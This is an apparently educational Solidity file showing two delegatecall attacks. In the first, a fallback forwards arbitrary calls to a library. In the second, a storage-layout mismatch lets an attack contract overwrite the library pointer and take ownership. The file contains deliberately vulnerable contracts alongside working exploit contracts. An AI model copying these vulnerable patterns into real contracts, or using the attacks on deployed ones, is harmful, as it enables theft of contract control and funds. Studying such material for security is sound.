//SPDX-License-Identifier:MIT
pragma solidity ^0.8.11;

// sources - https://solidity-by-example.org/ , https://blog.sigmaprime.io/solidity-security.html#delegatecall

//1)).

// delegatecall preserves context (storage, caller, etc...). this gives other contracts power to 
// change state variables in your contract.

/*
Working of this attack
1) The attack function in the Attack contract calls the own fuction in stupidContract
2) This activates the fallback function (msg.sender == attack contract address) which delegates the call to 
    the someLibrary contract;
3) The own function in someLibrary is called which changes the slot0 state variable to msg.sender (attack contract address)
4) This changes the slot0 state variable in stupidContract(owner) to msg.sender;
5) this successfully completes the attack
*/

contract someLibrary{
    
    address public owner; // slot0

    function own() public {
        owner = msg.sender;
    }

}

contract stupidContract{
    address public owner;     //slot0
    someLibrary public lib;     //slot1

    constructor(address _lib){
        lib = someLibrary(_lib);
    }

    fallback() external payable{
        address(lib).delegatecall(msg.data);
    }
}

contract Attack{
    address public stupidContract;      //slot0

    constructor(address _stupidConract){
        stupidContract = _stupidConract;
    }

    function attack() public {
        stupidContract.call(abi.encodeWithSignature("own()"));
    }
}

// 2))
// storage layout must be the same for the contract calling delegatecall and the contract getting called.
// if not this vulnerablity can be used by the attacker

/*
1) the attack function in the Attack2 contract Calls the do something function in stupid contract2 with its own address as an argument
2) this unction delegates the call to someotherlibrary contract and call its do fucntion with agrument the address of Attack contract typecasrted as uint
3)this function updates the slot0 in stupidcontract to the argument value(adress of attack contract).
  SO now instead of lib , the stupid contract has address of attack contract in slot0
4) now the attack function again calls the dosomething function in stupid contract.
5) this time instead of delegating the function to libraray contract , its gets delegated to dosomething of attack contract.
6) this function changes the slot1 state variable to the msg.sender(the attack contract address);
*/

contract someOtherLibraray{
    uint public someNumber; //slot0

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract stupidContract2{
    address public lib;      //slot0
    address public owner;    //slot1
    uint public someNumber;  //slot2

    constructor(address _lib){
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)" , _num));
    }
}

contract Attack2{
    //same layout as stupid contract

    address public lib;     //slot0
    address public owner;   //slot1
    uint public someNumber; //slot2

    stupidContract2 public StupidContract;

    constructor(address _addr){
        StupidContract = stupidContract2(_addr);
    }

    function attack() public {
        StupidContract.doSomething(uint(uint160(address(this))));

        StupidContract.doSomething(1);
    }

    function doSomething(uint _num) public{
        owner = msg.sender;
    }
}



